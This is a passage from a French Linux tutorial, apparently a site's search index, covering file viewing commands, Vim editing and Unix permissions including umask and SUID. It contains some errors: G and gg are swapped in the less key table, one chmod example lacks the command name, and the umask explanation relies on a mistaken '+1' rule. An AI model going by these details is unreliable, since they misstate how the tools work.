\u00e0<code>cat</code>. La touche <code>espace</code>permet de faire d\u00e9filer les pages, \u00c0 la fin du document la commande <code>more</code>se coupe et un nouveau prompt apparait Cependant il est possible via la touche <code>q</code> de quitter la commande more, dans l\u2019\u00e9ventualit\u00e9  o\u00f9 l\u2019information est trouv\u00e9e avant la fin du fichier.</p> <p>Option de <code>more</code></p> option -doption -s <p>affiche une aide succinct en bas de page</p> <p>supprime les lignes blanches en doublon au sein du fichier</p> <pre><code>user30@deb:~$ more /etc/passwd\nmathieu:x:1000:1000:mathieu,,,:/home/mathieu:/bin/bash\nuser01:x:1031:1031::/home/user01:/bin/bash\nuser02:x:1032:1032::/home/user02:/bin/bash\nuser03:x:1033:1033::/home/user03:/bin/bash\nuser04:x:1034:1034::/home/user04:/bin/bash\nuser05:x:1035:1035::/home/user05:/bin/bash\nuser06:x:1036:1036::/home/user06:/bin/bash\nuser07:x:1037:1037::/home/user07:/bin/bash\n--Plus--(65%)\n</code></pre>"},{"location":"Linux/Lire_editer_texte/#commande-less","title":"Commande <code>less</code>","text":"<p><code>less [-i -s] &lt;fichier&gt;</code></p> <p>Commande d\u00e9river de <code>more</code> permettant de lire le fichier\u00a0:  </p> <ul> <li>page par page</li> <li>ligne par ligne</li> <li>possibilit\u00e9 de remonter dans le fichier (via raccourci)</li> <li>possibilit\u00e9 de faire des recherches</li> </ul> <p>Option de <code>less</code></p> option -soption -i <p>supprime les lignes en doublons</p> <p>permet d'ignorer la casse lors des recherches</p> <p>\u00c0 la fin du fichier le mot (END) apparait La commande ne s\u2019arr\u00eate pas comme <code>cat</code> Cela permet de remonter le fichier.  </p> commande <code>less</code> <pre><code>user30@deb:~$ less /etc/passwd\nuser26:x:1056:1056::/home/user56:/bin/bash\nuser27:x:1057:1057::/home/user57:/bin/bash\nuser28:x:1058:1058::/home/user58:/bin/bash\nuser29:x:1059:1059::/home/user59:/bin/bash\nuser30:x:1060:1060::/home/user60:/bin/bash\nuser31:x:1061:1061::/home/user61:/bin/bash\nuser32:x:1062:1062::/home/user62:/bin/bash\n(END) # signifie la fin fichier\n</code></pre>"},{"location":"Linux/Lire_editer_texte/#commande-interne-a-la-commande","title":"Commande interne \u00e0 la commande","text":"commande description [space] faire d\u00e9filer une page <code>e</code> faire d\u00e9filer une ligne vers le bas <code>y</code> faire d\u00e9filer une ligne vers le haut <code>h</code> acc\u00e9der \u00e0 l\u2019aide-interne <code>G</code> se d\u00e9placer en d\u00e9but de fichier <code>gg</code> se d\u00e9placer en fin de fichier <code>q</code> quitter <code>/motif</code> chercher \"motif\" dans le texte \u00e0 l\u2019\u00e9cran <code>n</code> se d\u00e9placer \u00e0 la prochaine occurrence <code>N</code> se d\u00e9placer \u00e0 la pr\u00e9c\u00e9dente occurrence <code>less</code> + /[recherche] <pre><code>user30@deb:~$ less /etc/passwd\nuser30:x:1060:1060::/home/user30:/bin/bash\nuser31:x:1061:1061::/home/user31:/bin/bash\nuser32:x:1062:1062::/home/user32:/bin/bash\n/bash # stipule la recherche du terme \"bash\"\n</code></pre>"},{"location":"Linux/Lire_editer_texte/#commande-head","title":"commande <code>head</code>","text":"<p><code>head [-v -n nb] &lt;fichier&gt; &lt;fichier2&gt;</code></p> <p>Permets d\u2019afficher les premi\u00e8res lignes du fichier ce nombre peut-\u00eatre d\u00e9fini via l\u2019option [-n]. Sans pr\u00e9cision la commande affichera les 10\u00a0premi\u00e8res lignes.  </p> <p>Option de <code>head</code></p> option -noption -v <p>accompagn\u00e9 d'un nombre stipule le nb de ligne \u00e0 afficher</p> <p>Affiche en en-t\u00eates le nom du fichier pratique pour differencier plusieurs fichiers ouvert en m\u00eame temps.</p> <code>head</code> <pre><code>user30@deb:~$ head -n 4 liste.txt\nPremi\u00e8re ligne\nligne num\u00e9ro 2\n\nquatri\u00e8me ligne\nuser30@deb:~$\n</code></pre>"},{"location":"Linux/Lire_editer_texte/#commande-tail","title":"Commande <code>tail</code>","text":"<p><code>tail [-f -v -n nb] &lt;fichier&gt; &lt;fichier2&gt;</code></p> <p>Similaire \u00e0 la commande <code>head</code> \u00e0 la diff\u00e9rence que seules les derni\u00e8res lignes seront visibles Tr\u00e8s utile dans le cas de lecture de fichier de log  </p> <p>Option de <code>tail</code></p> option -noption -voption -f <p>accompagn\u00e9 d'un nombre stipule le nb de ligne \u00e0 afficher</p> <p>Affiche en en-t\u00eates le nom du fichier pratique pour differencier plusieurs fichiers ouvert en m\u00eame temps.</p> <p>Permet d'activer l'affichage en continue [ctrl+c] afin d'arreter le d\u00e9filement</p> <code>tail</code> Exemple 1Exemple 2 <pre><code>user30@deb:~$ tail -n 3 liste.txt\ndixi\u00e8me ligne\n\ndouzi\u00e8me et derni\u00e8re ligne\nuser30@deb:~$\n</code></pre> <pre><code>root@deb:~# tail -n2 -f /var/log/syslog\nJul 21 11:15:58 LinuxUtil systemd[1]: Started Cleanup of Temporary Directories.\nJul 21 11:17:01 LinuxUtil CRON[498]: (root) CMD (   cd / &amp;&amp; run-parts --report /etc/cron.hourly)\n</code></pre>"},{"location":"Linux/Lire_editer_texte/#commande-wc","title":"Commande <code>wc</code>","text":"<p><code>wc [-c -l -m -w] &lt;fichier&gt;</code></p> <p>Permets de compter le nombre de lignes, de mots, de caract\u00e8res ou d\u2019octets dans un fichier texte.  </p> <p>Option de <code>wc</code></p> option -loption -woption -moption -c <p>Compte le nombre de ligne</p> <p>Compte le nombre de mot</p> <p>Compte le nombre de caractere</p> <p>Compte le nombre d'octet</p> <code>wc</code> <pre><code>user30@deb:~$ wc -l liste.txt\n12 liste.txt # 12 lignes dans le fichier\nuser30@deb:~$ wc -w liste.txt\n17 liste.txt # 17 mots dans le fichier\nuser30@deb:~$ wc -m liste.txt\n107 liste.txt # 107 caract\u00e8res dans le fichier\nuser30@deb:~$ wc -c liste.txt\n113 liste.txt # 113 octets dans le fichier\n</code></pre>"},{"location":"Linux/Lire_editer_texte/#editer-du-texte","title":"Editer du texte","text":"<p>Objectifs\u00a0:  </p> <ul> <li>Comprendre Vim et ses modes de fonctionnement</li> <li>Savoir ajouter ou supprimer du texte</li> <li>Utiliser les commandes sp\u00e9cifiques de VIM</li> <li>G\u00e9rer les diff\u00e9rences des fichiers texte Windows et Linux</li> </ul> <p>Pr\u00e9sentation de diff\u00e9rents \u00e9diteurs de texte Unix/Linux</p> <p>\u00c9diteur de texte sous Unix/Linux</p> EmacsNanoVim <p>\u00c9diteur, ou plut\u00f4t famille d'\u00e9diteurs, ouvert, extensible, roche d nombreuses biblioth\u00e8ques. Il est destin\u00e9 \u00e0 des programmeurs.</p> <p>\u00c9diteur l\u00e9ger, avec coloration syntaxique. Souvent appr\u00e9ci\u00e9 des d\u00e9butants, il est moins puissant qu'un VIM ou Emacs.</p> <p>\u00c9diteur natif de Linux, issu de son anc\u00eatre Unix VI, Vim est un \u00e9diteur puissant, utilis\u00e9 autant par les administrateurs syst\u00e8mes que les programmeurs. Impl\u00e9mentant nativement les commandes ex.</p>"},{"location":"Linux/Lire_editer_texte/#vim","title":"Vim","text":"<ul> <li>Natif dans tout syst\u00e8me Unix/Linux</li> <li>\u00c9diteur par d\u00e9faut de certaines commandes, con\u00e7u pour fonctionner sur tous types de terminal</li> <li>Nomm\u00e9es VI sous Unix, les distributions Linux impl\u00e9mentent une d\u00e9clinaison nomm\u00e9e Vim</li> <li>Vim apporte la coloration syntaxique, plus d\u2019option pour l\u2019espace de travail, la possibilit\u00e9 d\u2019annuler plusieurs commandes  </li> </ul> <p><code>vi [-R] [+n] [+/motif] &lt;fichier&gt; (&lt;fichier2&gt; &lt;fichier3&gt;)</code></p> <p><code>vim [-R] [+n] [+/motif] &lt;fichier&gt; (&lt;fichier2&gt; &lt;fichier3&gt;)</code></p> <p>Option de <code>vim</code></p> option <code>-R</code>option <code>+n</code>option <code>+/motif</code> <p>Ouvrir le fichier en lecture seule</p> <p>Ouvrir le fichier et positionner le curseur en d\u00e9but de la ligne n</p> <p>Ouvrir le fichier et positionner le curseur sur la premi\u00e8re occurrence du mot motif</p> <code>vi</code> <pre><code>user30@deb:~$ vi Edition\n</code></pre> <p>Vim utilise 2\u00a0modes principaux</p> <p>Mode Commande\u00a0: d\u00e9placement du curseur, utilisation du presse papier, appel \u00e0 la ligne de commande  </p> <p>Mode Insertion\u00a0: Saisie du texte par l\u2019utilisateur. Se remarque par une indication sur la ligne de commande  </p>"},{"location":"Linux/Lire_editer_texte/#mode-commande","title":"Mode commande","text":"commande R\u00e9sultat commande R\u00e9sultat [fl\u00e8che gauche] ou <code>h</code> * Vers la gauche <code>w</code> * D\u00e9but du prochain mot ou ponctuation [fl\u00e8che bas] ou <code>j</code> * Vers le bas <code>b</code> * D\u00e9but du mot pr\u00e9c\u00e9dent ou ponctuation [fl\u00e8che haut] ou<code>k</code> * Vers le haut <code>e</code> * Fin du prochain mot ou ponctuation [fl\u00e8che droite] ou <code>l</code> * Vers la droite <code>:n</code> Se d\u00e9placer \u00e0 la ligne <code>n</code> <code>0</code> Premier caract\u00e8re de la ligne <code>gg</code> ou <code>:0</code> D\u00e9but du fichier <code>^</code> Premier caract\u00e8re du premier mot de la ligne <code>G</code> ou <code>:$</code> Fin du fichier <code>$</code> Dernier caract\u00e8re de la ligne <code>%</code> Se d\u00e9placer \u00e0 la prochaine accolade ou parenth\u00e8se <p><code>*</code>: Ces commandes peuvent \u00eatre multipli\u00e9es par le nombre <code>n</code> <code>5+[fl\u00e8che bas]</code>: pour descendre de 5\u00a0lignes par exemple  </p> <p>Rechercher un mot dans le texte </p> <p><code>/motif</code> - Rechercher le terme \"motif\" <code>n</code>      - Se d\u00e9placer vers la prochaine occurrence <code>N</code>      - Se d\u00e9placer vers l\u2019occurrence pr\u00e9c\u00e9dente  </p> <p>Utiliser la ligne de commande </p> <p><code>:w</code>     - Enregistrer les modifications <code>:wq</code>    - Enregistrer et quitter Vim <code>:x</code>     - Autre mani\u00e8re pour enregistrer et quitter <code>:q</code>     - Quitter un fichier sans modification <code>:q!</code>    - Quitter en ignorant les modifications  </p>"},{"location":"Linux/Lire_editer_texte/#mode-insertion","title":"Mode insertion","text":"<p>Passer en mode insertion </p> <p><code>a</code>      - Insertion apr\u00e8s le caract\u00e8re courant <code>i</code>      - Insertion avant le caract\u00e8re courant <code>o</code>      - Insertion au d\u00e9but d\u2019une nouvelle ligne suivant l\u2019actu <code>A</code>      - Insertion \u00e0 la fin de la ligne courante <code>I</code>      - Insertion au d\u00e9but de la ligne courante <code>O</code>      - Insertion au d\u00e9but d\u2019une nouvelle ligne pr\u00e9c\u00e9dant l\u2019actuelle  </p> <p>Sortir du mode insertion </p> <p>Simplement par la touche [echap]  </p> <p>Commandes diverses </p> Commande R\u00e9sultat <code>u</code> Annuler la derni\u00e8re action (\u00e9quivalent du [ctrl+z]) <code>[ctrl+r]</code> Refaire la derni\u00e8re action annul\u00e9e <code>:n</code> Passer au prochain fichier ouvert <code>:N</code> Passer au pr\u00e9c\u00e9dent fichier ouvert <code>:w [nom_de_fichier]</code> Enregistrer le contenu de l\u2019espace de travail dans <code>[nom_de_fichier]</code> <code>:!cmd</code> Ex\u00e9cuter la commande du shell cmd sans quitter Vim <code>:</code> Place le focus sur la ligne de commande Vim. Il d\u00e9bute toute utilisation de celle-ci. Il est possible de naviguer dans l\u2019historique des commandes comme on le ferait depuis le shell Bash."},{"location":"Linux/Lire_editer_texte/#copiercollerremplacer-et-supprimer-du-texte-avec-vim","title":"Copier/Coller/Remplacer et Supprimer du texte avec Vim","text":"<p>Important</p> Le presse-papier <p>ou Tampon Il s'agit du presse-papier de Vi et non le presse-papier du syst\u00e8me d'exploitation</p>"},{"location":"Linux/Lire_editer_texte/#supprimer-du-texte","title":"Supprimer du texte","text":"cmde Description <code>nx</code> Suppression du ou des n caract\u00e8res suivants <code>nX</code> Suppression ou des n caract\u00e8res pr\u00e9c\u00e9dents <code>D</code> Suppression du reste de la ligne \u00e0 droite du curseur <code>ndw</code> Suppression de n mots <code>ndd</code> Suppression de n lignes \u00e0 partir de la ligne courante"},{"location":"Linux/Lire_editer_texte/#copiercoller-du-texte","title":"Copier/coller du texte","text":"cmde Description <code>np</code> Coller n fois le contenu du tampon \u00e0 la suite du curseur <code>nP</code> Coller n fois le contenu du tampon avant le curseur <code>nyw</code> Copier les n mots suivant le curseur <code>nyy</code> Copier les n lignes suivantes"},{"location":"Linux/Lire_editer_texte/#couper-du-texte","title":"Couper du texte","text":"cmde Description <code>nx</code> Couper n caract\u00e8res suivants <code>nX</code> Couper n caract\u00e8res pr\u00e9c\u00e9dents <code>nD</code> Couper le reste de la ligne <code>dw</code> Couper n mots <code>ndd</code> Couper n lignes <p>Tampon d\u2019annulation</p> <p>La derni\u00e8re suppression est stock\u00e9e dans un tampon m\u00e9moire appel\u00e9 tampon d'annulation</p> <ul> <li>Il est possible d\u2019utiliser d\u2019autres tampons d\u2019annulation que celui par d\u00e9faut en pr\u00e9cisant des tampons de a \u00e0 z pr\u00e9c\u00e9der du caract\u00e8re[\"].<ul> <li><code>\"lyy</code>    Copier la ligne courante dans le tampon <code>l</code> </li> <li><code>\"lp</code>     Copier le contenu du tampon <code>l</code></li> </ul> </li> <li>Les tampons d\u2019annulation sont internes \u00e0 une instance de Vim</li> <li>Il est possible d\u2019utiliser les tampons dans tous les fichiers ouverts dans une instance de Vim</li> <li>\u00c0 la fermeture de Vim, ces m\u00e9moires sont vid\u00e9es</li> </ul>"},{"location":"Linux/Lire_editer_texte/#changerremplacer-du-texte","title":"Changer/Remplacer du texte","text":"cmde Description <code>ncl</code> Effacer (couper) n lettres et passer en mode insertion <code>ncw</code> Effacer (couper) n mots et passer en mode insertion <code>ncc</code> Effacer (couper) n lignes et passer en mode insertion <code>r[caract\u00e8res]</code> Remplace le caract\u00e8re sous le curseur par le [caract\u00e8re] <code>R</code> Passer en mode Remplacement (Mode Insertion ou le texte saisi remplace le texte actuel)"},{"location":"Linux/Lire_editer_texte/#the-power-of-g","title":"The Power of \"G\"","text":"<p>Syntaxe globale\u00a0:  </p> <p><code>:&lt;ligne&gt; g/regex de recherche/commande de modification</code></p> <p>Version courte\u00a0: <code>&lt;g/&lt;recherche&gt;/s//&lt;nouveau&gt;/g</code></p> <p>Utilisation g/../g</p> Substitution 1 <p><pre><code>:&lt;lignes&gt; g/rechlign/s/rechmod/nouveau/g\n:10,15 g/Suppression/s/caract\u00e8res/lettres/g\n</code></pre> Dans cette exemple la commande va permettre de remplacer le mot caract\u00e8res par lettres sur les ligne 10 \u00e0 15 dans les phrases commen\u00e7ant par Suppression</p> Substitution 2 <p><pre><code>:g/&lt;recherche&gt;/s//&lt;nouveau&gt;/g\n:g/Suppression/s//Retirer/g\n</code></pre> Permet de remplacer, sur l'int\u00e9gralit\u00e9 du fichier, de substituer le mot Suppression par le mot Retirer <pre><code>:g/Suppression/s/^#//\n</code></pre> Permet de substituer par rien le caract\u00e8re # sur les lignes commen\u00e7ant par le mot Supression</p>"},{"location":"Linux/Lire_editer_texte/#personnaliser-lenvironnement-vim","title":"Personnaliser l\u2019environnement Vim","text":"<p>La modification de l\u2019\u00e9diteur Vim est possible via la commande <code>set</code> Pour cela il suffit de taper, sur la ligne de commande <code>:set</code> </p> cmde Description <code>:set</code> Afficher les options personnalis\u00e9es <code>:set all</code> Afficher toutes les options disponibles <code>:set option</code> Activer une option <code>:set nooption</code> D\u00e9sactiver une option <code>:set option?</code> Afficher le statut d\u2019une option Options Description <code>compatible</code> Activer le mode compatible de Vi pour Vim <code>showmode</code> Afficher le mode de travail sur la ligne de commande <code>autoindent</code> Indentation automatique, utile en programmation/scripting <code>number</code> Afficher les num\u00e9ros de lignes <code>ignorecase</code> Pas de distinction minuscule/majuscule lors des recherches <code>tabstop</code> D\u00e9finir le nombre de caract\u00e8res d\u2019une tabulation (par d\u00e9faut\u00a08) <p>Afin de ne pas avoir \u00e0 retaper les options souhait\u00e9es \u00e0 chaque red\u00e9marrage de session, il est possible d\u2019enregistrer les options choisies dans un fichier de param\u00e8tres <code>~/.vimrc</code> </p> <p>Dans le fichier <code>~/.vimrc</code> il n'est pas n\u00e9cessaire d'inclure <code>:</code>. Les <code>:</code> ne sont utile que dans la ligne de commande. Dans le fichier la syntaxe sera: set nocompatible set number syntax on  </p>"},{"location":"Linux/Lire_editer_texte/#aide-interne","title":"Aide-interne","text":"<p>La commande <code>:help</code> (version courte<code>:h</code>) permet de se rendre dans l\u2019aide de Vim (en Anglais) Lanc\u00e9e seule, la commande nous am\u00e8ne sur la page \"Vim - main help file\" En g\u00e9n\u00e9ral, on l\u2019utilise avec un terme \u00e0 rechercher\u00a0: <code>:help insert</code> Pour sortir, comme dans Vim\u00a0: <code>:q</code></p>"},{"location":"Linux/Lire_editer_texte/#fin-de-ligne-en-fichier-texte","title":"Fin de ligne en Fichier Texte","text":"<p>Les fins de ligne sont trait\u00e9es diff\u00e9remment entre Windows et Linux.  </p> <p>Ceux-ci sont g\u00e9n\u00e9r\u00e9s par des caract\u00e8res sp\u00e9ciaux invisibles nomm\u00e9e  </p> <ul> <li>[CR] (carriage return) \\r\u00a0: Windows</li> <li>[LF] (Line Feed) \\n\u00a0: Windows et Linux</li> </ul> <p>Dans le cas d\u2019une lecture de fichier, g\u00e9n\u00e9r\u00e9 sur Windows, les caract\u00e8res [\\r] seront visibles. Ces caract\u00e8res peuvent poser probl\u00e8me \u00e0 la lecture et \u00e0 l\u2019ex\u00e9cution du fichier sur un syst\u00e8me Linux.</p> <p>Via l\u2019option set:fileformat=unix (version courte ff=unix) il sera possible de passer le fichier du mode dos \u00e0 Unix </p> <p>Dans <code>.vimrc</code> activer l\u2019option fileformats=unix (version courte ffs=unix) pour visualiser ce caract\u00e8re<code>\\r</code>. S\u2019il est pr\u00e9sent, il sera repr\u00e9sent\u00e9 par les caract\u00e8res <code>^M</code> </p> <p>Possibilit\u00e9 de convertir ce fichier, plus facilement que dans Vi, via les commandes\u00a0:  </p> <ul> <li>dos2unix et unix2dos issu du paquet dos2unix</li> <li>fromdos et todos issus du paquet tofrodos</li> </ul> <p>les paquets tofrodos et dos2unix se pas forc\u00e9ment install\u00e9 sur le Linux utilis\u00e9 Dans ce cas l'installation de ceux-ci sera possible sinon le passage par Vim sera obligatoire</p> <p>Sous Windows </p>"},{"location":"Linux/droits_fichiers_repertoires/","title":"Droits sur les fichiers et r\u00e9pertoires","text":""},{"location":"Linux/droits_fichiers_repertoires/#les-droits-unixlinux","title":"Les droits Unix/Linux","text":""},{"location":"Linux/droits_fichiers_repertoires/#les-types-de-droits","title":"Les types de droits","text":"<p>Le compte utilisateur vous permet de vous connecter \u00e0 Linux et d\u00e9finit les permissions et autorisations que vous pouvez effectuer.</p> <p>Ainsi on distingue :</p> <ul> <li>Propri\u00e9t\u00e9: L\u2019utilisateur et le groupe poss\u00e9dant le fichier, ce qui signifie qu\u2019ils l\u2019ont cr\u00e9\u00e9 ou ils ont \u00e9t\u00e9 attribu\u00e9s en tant que propri\u00e9taires du fichier ou du r\u00e9pertoire.</li> <li>Autorisations: repr\u00e9sentent l\u2019ensemble des actions que vous pouvez effectuer selon l'utilisateur que vous \u00eates (le compte d\u2019utilisateur avec lequel vous \u00eates connect\u00e9) et le groupe \u00e0 laquelle vous appartenez.</li> </ul> <p>La commande <code>whoami</code> permet d'afficher l'utilisateur avec lequel vous \u00eates connect\u00e9. La commande <code>groups</code> et/ou <code>id</code> affiche mes groupes auquel l'utilisateur appartient.  </p> <p>Les droits d'acc\u00e8s sur les fichiers sont directement inscrits dans l'inode des fichiers (r\u00e9pertoires). Ils sont d\u00e9coup\u00e9s en trois colonnes :</p> <ul> <li>u (user)  -&gt;  utilisateur propri\u00e9taire du fichier ou r\u00e9pertoire</li> <li>g (group) -&gt; groupe propri\u00e9taire</li> <li>o (other) -&gt; Autres</li> </ul> Droit Octal Fichier R\u00e9pertoire Lecture \u00ae 4 Permet de lire, ouvrir le fichier Permet de lister le contenu du dossier Ecriture (w) 2 Permet l'\u00e9criture/modification/changement de nom/suppression d'un fichier Permet de modifier le contenu du dossier (cr\u00e9er,copier,renommer,supprimer) Execution (x) 1 Permet d'ex\u00e9cuter le fichier binaire ou script shell Permet \u00e0 un utilisateur de traverserr ou d'acc\u00e9der \u00e0 un fichier dans le dossier. <p>Droit octal: Le 1,2,3 ne sont g\u00e9n\u00e9ralement pas utilis\u00e9. Plus souvent les 7,6,5,4 et 0 signifiant aucun droit.  </p> <p>Pour calculer des droits en octal, il faut additionner les valeurs des droits pr\u00e9sents pour les 3 groupes:  </p> <ul> <li>rwx = 4+2+1 = 7</li> <li>rw- = 4+2   = 6</li> <li>r-x = 4+1   = 5</li> <li>r-- = 4</li> </ul> Exemple <p>rwxrwxr-x = 775 rwxr-x--- = 750 rw-rw-r-- = 664  </p> <p>L'affichage des droits d'un fichier ou r\u00e9pertoire, sera possible avec la commande <code>ls -l</code></p> <pre><code>root@deb:~$ ls \u2013l\ntotal 16\n-rw------- 1 user30 user30 616 09:34 Edition\ndrwxr-xr-x 2 user30 user30 4096 17:36 Nantes\nlrwxrwxrwx 1 user30 user30 15 17:38 Quimper -&gt; Rennes/Quimper/\ndrwxr-xr-x 3 user30 user30 4096 17:36 Rennes\n-rw-r--r-- 1 user30 user30 33 17:35 todo.list\n</code></pre>"},{"location":"Linux/droits_fichiers_repertoires/#modifier-les-droits-et-proprietaires","title":"Modifier les droits et propri\u00e9taires","text":""},{"location":"Linux/droits_fichiers_repertoires/#modification-des-droits","title":"Modification des droits","text":""},{"location":"Linux/droits_fichiers_repertoires/#commande-chmod","title":"Commande <code>chmod</code>","text":"<p><code>chmod &lt;option&gt; [ugoa] [+ - =] [rwxX] fichier ou dossier</code> </p> <ul> <li>option : [-R]</li> <li>[ugoa] :<ul> <li>[u] : user</li> <li>[g] : group</li> <li>[o] : other</li> <li>[a] : all</li> </ul> </li> <li>[+ - =] :<ul> <li>[+] : Ajoute des autorisations \u00e0 un utilisateur sp\u00e9cifi\u00e9.</li> <li>[-] : Supprime les autorisations \u00e0 un utilisateur sp\u00e9cifi\u00e9.</li> <li>[=] : Attribue des autorisations distinctes des utilisateurs sp\u00e9cifi\u00e9 et supprime les autorisations pr\u00e9c\u00e9dentes du segment utilisateur.</li> </ul> </li> <li>[rwxX] :<ul> <li>[r] : read</li> <li>[w] : write</li> <li> : execution</li> <li> : modifie les attributs d'un r\u00e9pertoire et des sous-r\u00e9pertoires SANS toucher aux fichiers qui s'y trouvent.</li> </ul> </li> </ul> <p>Permets de modifier les droits d'un fichier ou dossier chmod Possibilit\u00e9 d'utiliser la commande de 2 fa\u00e7ons:</p> <ul> <li>Absolue: en octal ou symbolique avec le signe \"=\"</li> <li>Relative: en symbolique avec les signes \"+\" ou \"-\"</li> </ul> <p>Attention \u00e0 l'option [-R], le fait de r\u00e9aliser un <code>chmod</code>de fa\u00e7on r\u00e9cursive doit \u00eatre effectu\u00e9 de fa\u00e7on r\u00e9fl\u00e9chie et ne doit pas \u00eatre g\u00e9n\u00e9ralis\u00e9 \u00e0 tous les usages. De plus l'attention doit \u00eatre port\u00e9 sur le fait de bien utiliser le [-R (majuscule)]. l'utilisation d'un [-r (minuscule)] retirerais les droits en lecture sur les fichiers ou r\u00e9pertoire selectionn\u00e9s.  </p> Exemple d'utilisation <code>chmod</code> Modification permissions d'un r\u00e9pertoire notation symboliqueModification permissions d'un r\u00e9pertoire notation octaleModification permissions d'un r\u00e9pertoire ET de son contenu <p><pre><code>root@deb:~# chmod g+w,o-rx /data/commun\n</code></pre> Ici on ajoute au groupe le droit d'\u00e9criture (g+w), Et on retire aux autres les droits lecture et ex\u00e9cution (o-rx).</p> <p><pre><code>root@deb:~# 770 /data/commun\n</code></pre> Ici on accorde lecture, ecriture, ex\u00e9cution au utilisateur et groupe (77) et aucun droit aux autres (0).  </p> <p><pre><code>root@deb:~# chmod -R g+w,o-rx /data/commun\n</code></pre> Les droits ecriture son attribu\u00e9 au groupe (g+w) Les droits lecture et execution sont retir\u00e9s aux autre (o-rx) Ici l'utilisation du [-R] inclus la r\u00e9cursivit\u00e9, le contenus du r\u00e9pertoire /commun sera \u00e9galement modifi\u00e9.  </p>"},{"location":"Linux/droits_fichiers_repertoires/#commande-chown","title":"Commande <code>chown</code>","text":"<p><code>chown &lt;option&gt; [user]:[group] fichier(dossier)</code> </p> <p>Permets de modifier l'utilisateur propri\u00e9taire et le groupe propri\u00e9taire.  </p> <p>les options et syntaxe \u00e9tant identique que la commande <code>chmod</code> elle ne seront pas r\u00e9\u00e9crite ici.  </p> Exemple d'utilisation <code>chown</code> Modification utilisateur et groupe propri\u00e9taireModification uniquement le groupe propri\u00e9taire du dossiers <p><pre><code>root@deb:~# chown penthium:users /data\n</code></pre> L'utilisateur \"penthium\" et le groupe \"users\" deviennent propri\u00e9taire du r\u00e9pertoire data</p> <p><pre><code>root@deb:~# chown -R :users /dat/commun\n</code></pre> Le groupe \"users\" devient donc le propri\u00e9taire de /data/commun ainsi que de son contenu via l'utilisation de [-R].</p>"},{"location":"Linux/droits_fichiers_repertoires/#modele-de-droits-et-droits-speciaux","title":"Mod\u00e8le de droits et droits sp\u00e9ciaux","text":""},{"location":"Linux/droits_fichiers_repertoires/#commande-umask","title":"Commande <code>umask</code>","text":"<p><code>umask &lt;valeur umask&gt;</code></p> <p>umask (user file creation mask) est un param\u00e8tre syst\u00e8me d\u00e9terminant les permissions par d\u00e9faut appliqu\u00e9es aux nouveaux fichiers et r\u00e9pertoires cr\u00e9\u00e9s. Il sp\u00e9cifie les permissions qui doivent \u00eatre d\u00e9sactiv\u00e9es lors de la cr\u00e9ation d'un fichier ou d'un r\u00e9pertoire.  </p> <p>l'umask appliqu\u00e9 par d\u00e9faut est le 022. Il est imp\u00e9ratif de laisser cet umask pour les utilisateurs root et syst\u00e8mes (UID inf\u00e9rieur \u00e0 1000). Voir la conf dans le fichier <code>/etc/profile</code> ou <code>/etc/bashrc</code> </p> <p>Par exemple, si le umask est 022 et qu'un fichier est cr\u00e9\u00e9, les permissions seront par d\u00e9faut 644 (rw-r--r--). Le umask est exprim\u00e9 en base 8, avec les chiffres correspondant aux permissions pour le propri\u00e9taire, le groupe et les autres :  </p> <ul> <li>0 = --- (aucune permission)</li> <li>1 = --x (ex\u00e9cution seulement)</li> <li>2 = -w- (\u00e9criture seulement)</li> <li>3 = -wx (\u00e9criture et ex\u00e9cution)</li> <li>4 = r-- (lecture seulement)</li> <li>5 = r-x (lecture et ex\u00e9cution)</li> <li>6 = rw- (lecture et \u00e9criture)</li> <li>7 = rwx (lecture, \u00e9criture et ex\u00e9cution)</li> </ul> <p>Donc notre umask 022 donne :</p> <ul> <li>0 = aucune restriction pour le propri\u00e9taire</li> <li>2 = interdit l'\u00e9criture pour le groupe</li> <li>2 = interdit l'\u00e9criture pour les autres</li> </ul> <p>La valeur maximale des permissions pour un r\u00e9pertoire est de 777 (tous les droits \u00e0 tous le monde). La valeur maximale des permissions pour un fichier est de 666 (tous les droits pour tout les monde sauf l'ex\u00e9cution). En effet pour \u00e9viter les probl\u00e8mes un fichier ne sera jamais automatiquement autoris\u00e9 ex\u00e9cution, cela afin d'eviter par exemple de consid\u00e9rer un fichier comme un script). Cela provoque donc des diff\u00e9rences de droits lors de la cr\u00e9ation d'un r\u00e9pertoire ou d'un fichier Voila pourquoi le choix de l'umask sera toujours bas\u00e9 sur la cr\u00e9ation d'un r\u00e9pertoire et non d'un fichier.  </p> <p>Il est bon de savoir que si un fichier tombe sur une autorisation d'ex\u00e9cution lors de sa cr\u00e9ation alors le syst\u00e8me appliquera un \"+1\" sur l'octale ayant l'autorisation d'ex\u00e9cution. Par ex. umask 023 -&gt; 666-023 =643 soit rw-r---wx =&gt; avec le \"+1\" cela devient 644 soit rw-r--r-- Cela se traduit par : \"tous fichier ayant une octale impaire lors de sa cr\u00e9ation se verra appliquer un \"+1\" sur cette octale impaire.  </p> <p>Un umask est d\u00e9fini par session. Il peut \u00eatre modifi\u00e9 en utilisant la commande <code>umask &lt;valeur_umask&gt;</code> mais celui-ci ne sera modifi\u00e9 que pour la session courante de l'utilisateur, une fois d\u00e9connect\u00e9, le umask reviendra \u00e0 sa valeur par d\u00e9faut.  </p> <p>Pour le rendre permanent Il faut le d\u00e9finir dans son fichier de configuration personnel soit :</p> <ul> <li><code>~/.profile</code></li> <li><code>~/.bashrc</code></li> </ul> <p>Chaque processus ou script peut d\u00e9finir son propre umask qui s'appliquera uniquement \u00e0 ce processus</p>"},{"location":"Linux/droits_fichiers_repertoires/#suid-set-user-id","title":"SUID (Set User ID)","text":"<p><code>chmod u+s &lt;fichier&gt;</code> </p> <p>Lorsque le SUID est activ\u00e9 sur un fichier ex\u00e9cutable, il permet \u00e0 un utilisateur n'\u00e9tant pas le propri\u00e9taire du fichier de l'ex\u00e9cuter avec les m\u00eames droits que le propri\u00e9taire. Cette permission ne peut pas \u00eatre appliqu\u00e9e sur un r\u00e9pertoire. Fonction tres utile pour les programmes n\u00e9cessitant des privil\u00e8ges sp\u00e9cifiques pour s'ex\u00e9cuter correctement. Si un fichier b\u00e9n\u00e9ficie de cette permission cela sera visible par un \"s\" en lieu et place du \"x\" sur la partie utilisateur (1ere triplette de permissions)(--s --- ---). Un \"S\" majuscule signifie que la permission d'ex\u00e9cution n'est pas accord\u00e9e. passwd est un exemple classique, le SUID est activ\u00e9 pour que chaque utilisateur puisse changer son mdp sans avoir \u00e0 passer par l'administrateur.  </p>"},{"location":"Linux/droits_fichiers_repertoires/#sgid-set-group-id","title":"SGID (Set Group ID)","text":"<p><code>chmod g+s &lt;r\u00e9pertoires&gt;</code> </p> <p>Le SGID fonctionne de la m\u00eame mani\u00e8re que le SUID \u00e0 la diff\u00e9rence que celui-ci est 